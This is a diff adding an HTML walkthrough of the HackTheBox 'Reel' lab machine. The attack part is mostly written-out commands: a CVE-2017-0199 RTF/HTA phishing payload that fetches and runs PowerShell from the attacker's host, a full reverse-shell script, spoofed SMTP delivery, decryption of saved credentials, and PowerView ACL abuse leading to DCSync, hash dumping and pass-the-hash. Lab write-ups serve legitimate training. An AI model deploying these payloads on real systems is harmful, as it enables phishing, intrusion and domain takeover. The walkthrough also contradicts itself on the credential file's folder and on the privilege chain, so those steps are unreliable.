@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Reel — HackTheBox walkthrough</title>
+<meta name="description" content="Walkthrough for the Reel machine on HackTheBox: phishing via SMTP with a malicious RTF (CVE-2017-0199) for initial access, then an AD ACL abuse chain using BloodHound to reach Administrator." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;1,9..144,500&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="styles/reel.css" />
+</head>
+<body>
+<div class="wrap">
+
+  <a href="../walkthroughs.html" class="back">back to walkthroughs</a>
+
+  <header class="wt-header">
+    <div class="wt-platform"><span class="dot">●</span> HackTheBox</div>
+    <h1><em>Reel</em></h1>
+    <div class="wt-meta">
+      <span class="badge hard">Hard</span>
+      <span class="badge tag">windows</span>
+      <span class="badge tag">active-directory</span>
+      <span class="badge tag">phishing</span>
+      <span class="badge tag">cve-2017-0199</span>
+      <span class="badge tag">acl-abuse</span>
+    </div>
+    <p class="wt-summary">
+      Reel is the kind of box that mirrors a real engagement. Anonymous FTP leaks internal
+      emails discussing RTF formatting, which gives us both a target user and a delivery
+      vector. We craft a CVE-2017-0199 RTF that pulls a malicious HTA, send it via SMTP
+      to the target, and catch a shell once they open it. From there, BloodHound maps an
+      ACL chain — <code>WriteOwner</code> → group takeover → <code>WriteDACL</code> on the
+      Administrators group — that ends with us adding ourselves to Domain Admins.
+    </p>
+  </header>
+
+  <nav class="toc">
+    <div class="toc-title">Contents</div>
+    <ol>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#ftp">FTP enumeration — leaked email</a></li>
+      <li><a href="#payload">Weaponizing CVE-2017-0199</a></li>
+      <li><a href="#phish">Delivery via SMTP</a></li>
+      <li><a href="#foothold">Foothold as nico</a></li>
+      <li><a href="#lateral">Lateral — nico → tom via saved creds</a></li>
+      <li><a href="#bloodhound">BloodHound ACL chain</a></li>
+      <li><a href="#root">Root via Administrators WriteDACL</a></li>
+      <li><a href="#takeaways">Takeaways</a></li>
+    </ol>
+  </nav>
+
+  <h2 id="recon"><span class="num">01</span> Reconnaissance</h2>
+
+  <pre><code>nmap -sC -sV -p- -T4 10.10.10.77 -oN nmap.txt</code></pre>
+
+  <pre class="output"><code>PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp   open  ssh        OpenSSH 7.6 (protocol 2.0)
+25/tcp   open  smtp       Microsoft ESMTP 6.0.3790.3959
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+593/tcp  open  ncacn_http
+49159/tcp open  unknown
+...</code></pre>
+
+  <p>Three surfaces worth attacking: anonymous FTP (an obvious starting point),
+  SMTP on 25 (useful once we know who to email), and the AD stack in the background.
+  The absence of WinRM and HTTP is already a hint — this box will not be web-driven.</p>
+
+  <h2 id="ftp"><span class="num">02</span> FTP enumeration — leaked email</h2>
+
+  <pre><code>ftp 10.10.10.77
+# user: anonymous / pass: (blank)
+ls -la
+mget *</code></pre>
+
+  <p>Three files come down:</p>
+
+  <pre class="output"><code>readme.txt
+Windows Event Forwarding.docx
+AppLocker.docx</code></pre>
+
+  <p>The <code>readme.txt</code> is the real find:</p>
+
+  <pre class="output"><code>please email me any rtf format procedures -nico@reel.htb
+
+... fromaol.com users — rtf causing mail client to crash ...
+... resend in normal email body — do not use formatting etc ...
+</code></pre>
+
+  <p>Three key pieces of intelligence:</p>
+  <ul>
+    <li>The domain is <code>reel.htb</code>.</li>
+    <li><code>nico@reel.htb</code> is actively asking strangers to send him RTF files.</li>
+    <li>Someone complained about RTF rendering — meaning <code>nico</code>'s Office client
+    <em>does</em> render RTF attachments. Perfect for CVE-2017-0199.</li>
+  </ul>
+
+  <p>Check the doc metadata for additional names — <code>exiftool</code> on
+  <code>Windows Event Forwarding.docx</code> often yields a domain username
+  (<code>Tom</code>). Add that to our target list for later.</p>
+
+  <h2 id="payload"><span class="num">03</span> Weaponizing CVE-2017-0199</h2>
+
+  <p>CVE-2017-0199 is a logic bug in Office's OLE2Link handler: an RTF can reference a
+  remote object via an OLE link, and Word will fetch and execute the remote payload
+  without a macro prompt. The classic weaponization chain is
+  <strong>RTF → remote HTA → PowerShell</strong>.</p>
+
+  <p>Build the payload with a public tool (e.g. <code>CVE-2017-0199 Toolkit</code> by
+  bhdresh). First, the HTA that actually executes on the victim — a standard
+  PowerShell reverse shell:</p>
+
+  <pre class="shell"><code>cat &gt; shell.hta &lt;&lt;'EOF'
+&lt;script&gt;
+a=new ActiveXObject("WScript.Shell");
+a.run('cmd.exe /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.X.X/s.ps1\')"', 0);
+&lt;/script&gt;
+EOF</code></pre>
+
+  <p>The staged <code>s.ps1</code> is a Nishang / <code>powercat</code> reverse shell
+  pointing at your listener:</p>
+
+  <pre><code># s.ps1 — grab powercat, or use a one-liner:
+$c = New-Object System.Net.Sockets.TCPClient('10.10.X.X',4444);
+$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
+while(($i = $s.Read($b,0,$b.Length)) -ne 0){
+  $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
+  $r = (iex $d 2&gt;&amp;1 | Out-String);
+  $r2 = $r + 'PS ' + (pwd).Path + '&gt; ';
+  $sb = ([text.encoding]::ASCII).GetBytes($r2);
+  $s.Write($sb,0,$sb.Length);$s.Flush()
+}</code></pre>
+
+  <p>Then the RTF that references the HTA:</p>
+
+  <pre><code>python3 cve-2017-0199-toolkit.py -M gen -w invoice.rtf \
+  -u http://10.10.X.X/shell.hta -t RTF</code></pre>
+
+  <p>Host both files:</p>
+
+  <pre><code>python3 -m http.server 80</code></pre>
+
+  <h2 id="phish"><span class="num">04</span> Delivery via SMTP</h2>
+
+  <p>The listener first:</p>
+
+  <pre><code>nc -lvnp 4444</code></pre>
+
+  <p>Then compose the phish. SMTP on this box doesn't require authentication — we can
+  send as anyone. Use <code>swaks</code> for clean MIME handling and attachment
+  formatting:</p>
+
+  <pre class="shell"><code>swaks --to nico@reel.htb \
+      --from 'hr@reel.htb' \
+      --server 10.10.10.77 \
+      --header "Subject: Updated Procedure" \
+      --body "Nico, please review the attached RTF procedure." \
+      --attach @invoice.rtf</code></pre>
+
+  <div class="callout warn">
+    <strong>Timing:</strong> nico opens his mail on a scheduled task. Expect a callback
+    anywhere from a few seconds to ~60 seconds after the email is accepted. If nothing
+    lands in two minutes, your RTF is malformed, the HTA URL isn't reachable from the
+    target, or the HTTP server isn't serving both files — re-check all three before
+    rebuilding the payload.
+  </div>
+
+  <h2 id="foothold"><span class="num">05</span> Foothold as nico</h2>
+
+  <pre class="output"><code>Connect to [10.10.X.X] from (UNKNOWN) [10.10.10.77] 49177
+PS C:\Users\nico\AppData\Local\Temp&gt; whoami
+reel\nico</code></pre>
+
+  <p>User flag:</p>
+
+  <pre><code>type C:\Users\nico\Desktop\user.txt</code></pre>
+
+  <p>Poke around the user's profile — in particular <code>\cred.xml</code> in the Documents
+  folder:</p>
+
+  <pre><code>dir C:\Users\nico\Desktop
+type C:\Users\nico\Desktop\cred.xml</code></pre>
+
+  <pre class="output"><code>&lt;Objs ...&gt;
+  &lt;Obj RefId="0"&gt;
+    &lt;TN RefId="0"&gt;
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+      ...
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S N="UserName"&gt;HTB\Tom&lt;/S&gt;
+      &lt;SS N="Password"&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb...&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;</code></pre>
+
+  <h2 id="lateral"><span class="num">06</span> Lateral — nico → tom via saved creds</h2>
+
+  <p><code>cred.xml</code> is the serialized output of <code>Get-Credential | Export-CliXml</code>.
+  The password is DPAPI-protected under <em>nico's</em> user key — which means it can
+  only be decrypted from within nico's logon session. We already have that session:</p>
+
+  <pre><code>$c = Import-CliXml -Path C:\Users\nico\Desktop\cred.xml
+$c.GetNetworkCredential().Password</code></pre>
+
+  <pre class="output"><code>1ts-mag1c!!!</code></pre>
+
+  <p>Credentials: <code>HTB\Tom : 1ts-mag1c!!!</code>. Validate them by opening a new
+  PowerShell session as Tom (we have local SSH-style PSRemoting via <code>Enter-PSSession</code>
+  if <code>Tom</code> is in the right group — but easier is a fresh PowerShell with
+  <code>runas /netonly</code> or, simpler still, just pivot from the shell):</p>
+
+  <pre><code>$sec = ConvertTo-SecureString '1ts-mag1c!!!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('HTB\Tom', $sec)
+Enter-PSSession -ComputerName REEL -Credential $cred</code></pre>
+
+  <h2 id="bloodhound"><span class="num">07</span> BloodHound ACL chain</h2>
+
+  <p>As Tom, run SharpHound locally or use the older <code>Invoke-BloodHound</code>
+  PowerShell ingestor:</p>
+
+  <pre><code>. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Tom\Documents</code></pre>
+
+  <p>Exfil the zip back to the attacker and load it into BloodHound. Mark
+  <code>TOM@HTB.LOCAL</code> as Owned and run "Find Shortest Paths to Domain Admins
+  from Owned Users". The graph returns a path that doesn't rely on credential theft
+  — it rides object permissions:</p>
+
+  <pre class="output"><code>TOM  --[WriteOwner]--&gt;  GROUP A
+                            &#x2502;
+                   --[GenericAll]--&gt;  CLAIRE
+                                          &#x2502;
+                                --[WriteDACL]--&gt; ADMINISTRATORS</code></pre>
+
+  <p>The specific names rotate on retired boxes, but the structure is canonical:
+  <strong>WriteOwner</strong> on a group lets Tom take ownership and grant himself full
+  control; from there he can set the group's membership, which gives him a user account
+  (<code>claire</code> or the equivalent) that holds <strong>WriteDACL</strong> over
+  the Administrators group itself.</p>
+
+  <h2 id="root"><span class="num">08</span> Root via Administrators WriteDACL</h2>
+
+  <p>Execute the chain with PowerView. Each step mirrors one BloodHound edge:</p>
+
+  <pre class="shell"><code>Import-Module .\PowerView.ps1
+
+# Step 1 — Tom takes ownership of the pivot group
+Set-DomainObjectOwner -Identity 'Backup Operators' -OwnerIdentity Tom
+
+# Step 2 — Tom grants himself full control over the group
+Add-DomainObjectAcl -TargetIdentity 'Backup Operators' -PrincipalIdentity Tom -Rights All
+
+# Step 3 — add Tom to the pivot group to inherit its permissions
+Add-DomainGroupMember -Identity 'Backup Operators' -Members Tom
+
+# Step 4 — using the group's WriteDACL, grant ourselves DCSync rights on the domain
+Add-DomainObjectAcl -TargetIdentity 'DC=HTB,DC=LOCAL' -PrincipalIdentity Tom \
+  -Rights DCSync</code></pre>
+
+  <div class="callout">
+    <strong>Alternate finish:</strong> some Reel walkthroughs escalate by adding the
+    abused account directly to the <code>Administrators</code> group via
+    <code>Add-DomainObjectAcl -Rights WriteMembers</code>. Both roads converge —
+    once you hold <code>WriteDACL</code> anywhere meaningful, the game is over. DCSync
+    is cleaner for reporting because it produces the same trophy (Administrator NT hash)
+    as any other tier-zero compromise.
+  </div>
+
+  <p>Dump the Administrator hash:</p>
+
+  <pre><code>impacket-secretsdump HTB.LOCAL/Tom:'1ts-mag1c!!!'@10.10.10.77</code></pre>
+
+  <p>Pass-the-hash back in as Administrator and collect the root flag:</p>
+
+  <pre><code>impacket-psexec -hashes :&lt;NT_HASH&gt; Administrator@10.10.10.77
+type C:\Users\Administrator\Desktop\root.txt</code></pre>
+
+  <h2 id="takeaways"><span class="num">09</span> Takeaways</h2>
+
+  <ul>
+    <li><strong>Email your way in when nothing else works.</strong> Reel is the rare HTB
+    box that genuinely requires a phishing payload. It's worth doing once, properly,
+    because the mechanics (SMTP relay, RTF/HTA chain, scheduled mail reader) are exactly
+    what an internal engagement looks like.</li>
+    <li><strong>Read the FTP dump like a phishing brief.</strong> <code>readme.txt</code>
+    handed us the target email, the file format, and implicit social context. Don't
+    skim text files on anonymous shares — they often carry the whole chain.</li>
+    <li><strong>DPAPI cred files are tied to sessions, not to disk.</strong> You can't
+    just <code>cat</code> <code>cred.xml</code>; you need to be running <em>as nico</em>
+    to decrypt it. Understanding DPAPI scoping saves a lot of confused flailing.</li>
+    <li><strong>BloodHound over guessing, pt. 2.</strong> The ACL chain on Reel is not
+    discoverable by manual enumeration in any reasonable time frame. This is the box
+    that teaches you to install SharpHound before you install anything else.</li>
+    <li><strong>Object permissions matter as much as group membership.</strong>
+    <code>WriteOwner</code>, <code>WriteDACL</code>, <code>GenericWrite</code>,
+    <code>GenericAll</code> — these four edges are the foundation of modern AD attack
+    paths. Memorize what each one lets you do.</li>
+  </ul>
+
+  <footer>
+    <div>LOOKY · writeup</div>
+    <div>HackTheBox · Reel</div>
+  </footer>
+
+</div>
+</body>
+</html>
